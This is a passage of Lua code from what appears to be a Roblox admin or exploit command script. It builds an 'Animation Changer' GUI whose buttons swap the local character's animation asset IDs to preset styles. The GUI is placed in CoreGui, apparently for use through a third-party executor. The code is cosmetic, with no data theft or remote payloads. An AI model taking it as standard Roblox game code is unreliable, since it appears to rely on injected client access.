			A_Pirate.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Robot.Name = "A_Robot"
			A_Robot.Parent = NormalTab
			A_Robot.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Robot.BorderSizePixel = 0
			A_Robot.Position = UDim2.new(0, 0, 0.291479498, 0)
			A_Robot.Size = UDim2.new(0, 150, 0, 30)
			A_Robot.Font = Enum.Font.SciFi
			A_Robot.Text = "Robot"
			A_Robot.TextColor3 = Color3.new(1, 1, 1)
			A_Robot.TextSize = 20
			A_Robot.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Stylish.Name = "A_Stylish"
			A_Stylish.Parent = NormalTab
			A_Stylish.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Stylish.BorderSizePixel = 0
			A_Stylish.Position = UDim2.new(0, 0, 0.232816339, 0)
			A_Stylish.Size = UDim2.new(0, 150, 0, 30)
			A_Stylish.Font = Enum.Font.SciFi
			A_Stylish.Text = "Stylish"
			A_Stylish.TextColor3 = Color3.new(1, 1, 1)
			A_Stylish.TextSize = 20
			A_Stylish.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_SuperHero.Name = "A_SuperHero"
			A_SuperHero.Parent = NormalTab
			A_SuperHero.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_SuperHero.BorderSizePixel = 0
			A_SuperHero.Position = UDim2.new(0, 0, 0.464919746, 0)
			A_SuperHero.Size = UDim2.new(0, 150, 0, 30)
			A_SuperHero.Font = Enum.Font.SciFi
			A_SuperHero.Text = "SuperHero"
			A_SuperHero.TextColor3 = Color3.new(1, 1, 1)
			A_SuperHero.TextSize = 20
			A_SuperHero.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Toy.Name = "A_Toy"
			A_Toy.Parent = NormalTab
			A_Toy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Toy.BorderSizePixel = 0
			A_Toy.Position = UDim2.new(6.51925802e-09, 0, 0.756028414, 0)
			A_Toy.Size = UDim2.new(0, 150, 0, 30)
			A_Toy.Font = Enum.Font.SciFi
			A_Toy.Text = "Toy"
			A_Toy.TextColor3 = Color3.new(1, 1, 1)
			A_Toy.TextSize = 20
			A_Toy.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Vampire.Name = "A_Vampire"
			A_Vampire.Parent = NormalTab
			A_Vampire.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Vampire.BorderSizePixel = 0
			A_Vampire.Position = UDim2.new(0, 0, 0.934021354, 0)
			A_Vampire.Size = UDim2.new(0, 150, 0, 30)
			A_Vampire.Font = Enum.Font.SciFi
			A_Vampire.Text = "Vampire"
			A_Vampire.TextColor3 = Color3.new(1, 1, 1)
			A_Vampire.TextSize = 20
			A_Vampire.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Werewolf.Name = "A_Werewolf"
			A_Werewolf.Parent = NormalTab
			A_Werewolf.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Werewolf.BorderSizePixel = 0
			A_Werewolf.Position = UDim2.new(-0.000333368778, 0, 0.174509808, 0)
			A_Werewolf.Size = UDim2.new(0, 150, 0, 30)
			A_Werewolf.Font = Enum.Font.SciFi
			A_Werewolf.Text = "Werewolf"
			A_Werewolf.TextColor3 = Color3.new(1, 1, 1)
			A_Werewolf.TextSize = 20
			A_Werewolf.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Zombie.Name = "A_Zombie"
			A_Zombie.Parent = NormalTab
			A_Zombie.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Zombie.BorderSizePixel = 0
			A_Zombie.Position = UDim2.new(-1.1920929e-07, 0, 0.582352936, 0)
			A_Zombie.Size = UDim2.new(0, 150, 0, 30)
			A_Zombie.Font = Enum.Font.SciFi
			A_Zombie.Text = "Zombie"
			A_Zombie.TextColor3 = Color3.new(1, 1, 1)
			A_Zombie.TextSize = 20
			A_Zombie.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Category.Name = "Category"
			Category.Parent = NormalTab
			Category.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category.BorderSizePixel = 0
			Category.Size = UDim2.new(0, 150, 0, 30)
			Category.Text = "Normal"
			Category.TextColor3 = Color3.new(0, 0.835294, 1)
			Category.TextSize = 14

			SpecialTab.Name = "SpecialTab"
			SpecialTab.Parent = Main
			SpecialTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			SpecialTab.BackgroundTransparency = 1
			SpecialTab.BorderSizePixel = 0
			SpecialTab.Position = UDim2.new(0, 0, 0.119999997, 0)
			SpecialTab.Size = UDim2.new(0, 150, 0, 230)

			A_Patrol.Name = "A_Patrol"
			A_Patrol.Parent = SpecialTab
			A_Patrol.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Patrol.BorderSizePixel = 0
			A_Patrol.Position = UDim2.new(0, 0, 0.259960413, 0)
			A_Patrol.Size = UDim2.new(0, 150, 0, 30)
			A_Patrol.Font = Enum.Font.SciFi
			A_Patrol.Text = "Patrol"
			A_Patrol.TextColor3 = Color3.new(1, 1, 1)
			A_Patrol.TextSize = 20
			A_Patrol.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Confident.Name = "A_Confident"
			A_Confident.Parent = SpecialTab
			A_Confident.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Confident.BorderSizePixel = 0
			A_Confident.Position = UDim2.new(0, 0, 0.389248967, 0)
			A_Confident.Size = UDim2.new(0, 150, 0, 30)
			A_Confident.Font = Enum.Font.SciFi
			A_Confident.Text = "Confident"
			A_Confident.TextColor3 = Color3.new(1, 1, 1)
			A_Confident.TextSize = 20
			A_Confident.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Popstar.Name = "A_Popstar"
			A_Popstar.Parent = SpecialTab
			A_Popstar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Popstar.BorderSizePixel = 0
			A_Popstar.Position = UDim2.new(0, 0, 0.130671918, 0)
			A_Popstar.Size = UDim2.new(0, 150, 0, 30)
			A_Popstar.Font = Enum.Font.SciFi
			A_Popstar.Text = "Popstar"
			A_Popstar.TextColor3 = Color3.new(1, 1, 1)
			A_Popstar.TextSize = 20
			A_Popstar.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Cowboy.Name = "A_Cowboy"
			A_Cowboy.Parent = SpecialTab
			A_Cowboy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Cowboy.BorderSizePixel = 0
			A_Cowboy.Position = UDim2.new(0, 0, 0.772964239, 0)
			A_Cowboy.Size = UDim2.new(0, 150, 0, 30)
			A_Cowboy.Font = Enum.Font.SciFi
			A_Cowboy.Text = "Cowboy"
			A_Cowboy.TextColor3 = Color3.new(1, 1, 1)
			A_Cowboy.TextSize = 20
			A_Cowboy.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Ghost.Name = "A_Ghost"
			A_Ghost.Parent = SpecialTab
			A_Ghost.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Ghost.BorderSizePixel = 0
			A_Ghost.Position = UDim2.new(0, 0, 0.900632322, 0)
			A_Ghost.Size = UDim2.new(0, 150, 0, 30)
			A_Ghost.Font = Enum.Font.SciFi
			A_Ghost.Text = "Ghost"
			A_Ghost.TextColor3 = Color3.new(1, 1, 1)
			A_Ghost.TextSize = 20
			A_Ghost.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Sneaky.Name = "A_Sneaky"
			A_Sneaky.Parent = SpecialTab
			A_Sneaky.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Sneaky.BorderSizePixel = 0
			A_Sneaky.Position = UDim2.new(0, 0, 0.517628431, 0)
			A_Sneaky.Size = UDim2.new(0, 150, 0, 30)
			A_Sneaky.Font = Enum.Font.SciFi
			A_Sneaky.Text = "Sneaky"
			A_Sneaky.TextColor3 = Color3.new(1, 1, 1)
			A_Sneaky.TextSize = 20
			A_Sneaky.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Princess.Name = "A_Princess"
			A_Princess.Parent = SpecialTab
			A_Princess.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Princess.BorderSizePixel = 0
			A_Princess.Position = UDim2.new(0, 0, 0.645296335, 0)
			A_Princess.Size = UDim2.new(0, 150, 0, 30)
			A_Princess.Font = Enum.Font.SciFi
			A_Princess.Text = "Princess"
			A_Princess.TextColor3 = Color3.new(1, 1, 1)
			A_Princess.TextSize = 20
			A_Princess.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Category_2.Name = "Category"
			Category_2.Parent = SpecialTab
			Category_2.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category_2.BorderSizePixel = 0
			Category_2.Size = UDim2.new(0, 150, 0, 30)
			Category_2.Text = "Special"
			Category_2.TextColor3 = Color3.new(0, 0.835294, 1)
			Category_2.TextSize = 14

			OtherTab.Name = "OtherTab"
			OtherTab.Parent = Main
			OtherTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			OtherTab.BackgroundTransparency = 1
			OtherTab.BorderSizePixel = 0
			OtherTab.Position = UDim2.new(0, 0, 1.06800008, 0)
			OtherTab.Size = UDim2.new(0, 150, 0, 220)

			Category_3.Name = "Category"
			Category_3.Parent = OtherTab
			Category_3.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category_3.BorderSizePixel = 0
			Category_3.Size = UDim2.new(0, 150, 0, 30)
			Category_3.Text = "Other"
			Category_3.TextColor3 = Color3.new(0, 0.835294, 1)
			Category_3.TextSize = 14

			A_None.Name = "A_None"
			A_None.Parent = OtherTab
			A_None.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_None.BorderSizePixel = 0
			A_None.Position = UDim2.new(0, 0, 0.134545445, 0)
			A_None.Size = UDim2.new(0, 150, 0, 30)
			A_None.Font = Enum.Font.SciFi
			A_None.Text = "None"
			A_None.TextColor3 = Color3.new(1, 1, 1)
			A_None.TextSize = 20
			A_None.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Anthro.Name = "A_Anthro"
			A_Anthro.Parent = OtherTab
			A_Anthro.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Anthro.BorderSizePixel = 0
			A_Anthro.Position = UDim2.new(0, 0, 0.269090891, 0)
			A_Anthro.Size = UDim2.new(0, 150, 0, 30)
			A_Anthro.Font = Enum.Font.SciFi
			A_Anthro.Text = "Anthro (Default)"
			A_Anthro.TextColor3 = Color3.new(1, 1, 1)
			A_Anthro.TextSize = 20
			A_Anthro.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Main:TweenPosition(UDim2.new(0.421999991, 0, 0.28400004, 0))
		end;
	});

	addCommand({
		["Name"] = "animationchanger";
		["Function"] = function()
			local AnimationChanger = Instance.new("ScreenGui")
			local Main = Instance.new("Frame")
			local TopBar = Instance.new("Frame")
			local Close = Instance.new("TextButton")
			local TextLabel = Instance.new("TextLabel")
			local TextLabel_2 = Instance.new("TextLabel")
			local NormalTab = Instance.new("Frame")
			local A_Astronaut = Instance.new("TextButton")
			local A_Bubbly = Instance.new("TextButton")
			local A_Cartoony = Instance.new("TextButton")
			local A_Elder = Instance.new("TextButton")
			local A_Knight = Instance.new("TextButton")
			local A_Levitation = Instance.new("TextButton")
			local A_Mage = Instance.new("TextButton")
			local A_Ninja = Instance.new("TextButton")
			local A_Pirate = Instance.new("TextButton")
			local A_Robot = Instance.new("TextButton")
			local A_Stylish = Instance.new("TextButton")
			local A_SuperHero = Instance.new("TextButton")
			local A_Toy = Instance.new("TextButton")
			local A_Vampire = Instance.new("TextButton")
			local A_Werewolf = Instance.new("TextButton")
			local A_Zombie = Instance.new("TextButton")
			local Category = Instance.new("TextLabel")
			local SpecialTab = Instance.new("Frame")
			local A_Patrol = Instance.new("TextButton")
			local A_Confident = Instance.new("TextButton")
			local A_Popstar = Instance.new("TextButton")
			local A_Cowboy = Instance.new("TextButton")
			local A_Ghost = Instance.new("TextButton")
			local A_Sneaky = Instance.new("TextButton")
			local A_Princess = Instance.new("TextButton")
			local Category_2 = Instance.new("TextLabel")
			local OtherTab = Instance.new("Frame")
			local Category_3 = Instance.new("TextLabel")
			local A_None = Instance.new("TextButton")
			local A_Anthro = Instance.new("TextButton")

			AnimationChanger.Name = "AnimationChanger"
			AnimationChanger.Parent = game:WaitForChild("CoreGui")
			AnimationChanger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

			Main.Name = "Main"
			Main.Parent = AnimationChanger
			Main.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			Main.BorderSizePixel = 0
			Main.Position = UDim2.new(0.421999991, 0, -1, 0)
			Main.Size = UDim2.new(0, 300, 0, 250)
			Main.Active = true
			Main.Draggable = true

			TopBar.Name = "TopBar"
			TopBar.Parent = Main
			TopBar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			TopBar.BorderSizePixel = 0
			TopBar.Size = UDim2.new(0, 300, 0, 30)

			Close.Name = "Close"
			Close.Parent = TopBar
			Close.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			Close.BorderSizePixel = 0
			Close.Position = UDim2.new(0.899999976, 0, 0, 0)
			Close.Size = UDim2.new(0, 30, 0, 30)
			Close.Font = Enum.Font.SciFi
			Close.Text = "x"
			Close.TextColor3 = Color3.new(1, 0, 0.0156863)
			Close.TextSize = 20
			Close.MouseButton1Click:Connect(function()
				wait(0.3)
				Main:TweenPosition(UDim2.new(0.421999991, 0, -1.28400004, 0))
				wait(3)
				AnimationChanger:Destroy()
			end)

			TextLabel.Parent = TopBar
			TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0, 0, 0.600000024, 0)
			TextLabel.Size = UDim2.new(0, 270, 0, 10)
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.Text = "Fixed by Compwnter#5640"
			TextLabel.TextColor3 = Color3.new(1, 1, 1)
			TextLabel.TextSize = 15

			TextLabel_2.Parent = TopBar
			TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel_2.BackgroundTransparency = 1
			TextLabel_2.BorderSizePixel = 0
			TextLabel_2.Position = UDim2.new(0, 0, -0.0266667679, 0)
			TextLabel_2.Size = UDim2.new(0, 270, 0, 20)
			TextLabel_2.Font = Enum.Font.SourceSans
			TextLabel_2.Text = "Animation Changer"
			TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
			TextLabel_2.TextSize = 20

			NormalTab.Name = "NormalTab"
			NormalTab.Parent = Main
			NormalTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
